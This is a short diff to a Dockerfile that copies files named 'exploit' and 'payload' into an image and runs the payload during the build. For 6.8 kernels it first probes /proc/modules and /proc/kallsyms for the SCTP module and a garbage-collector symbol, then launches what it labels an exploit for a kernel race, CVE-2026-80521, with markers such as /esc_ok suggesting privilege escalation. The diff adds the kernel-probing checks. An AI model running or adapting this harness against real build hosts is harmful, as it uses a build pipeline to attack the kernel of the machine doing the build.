@@ -7,7 +7,7 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=1144
+ARG CACHEBUST=1145
 RUN sh -c '{ \
 echo "CB=$CACHEBUST"; \
 KVER=$(uname -r); \
@@ -28,6 +28,9 @@ case "$KVER" in \
     ;; \
   6.8.*) \
     echo "TARGET KERNEL 137+ — SCC GC (plurality KASLR)"; \
+    echo "--- MODULE CHECK ---"; \
+    grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
+    grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     timeout 600 /payload 2>&1; \
     EC=$?; \
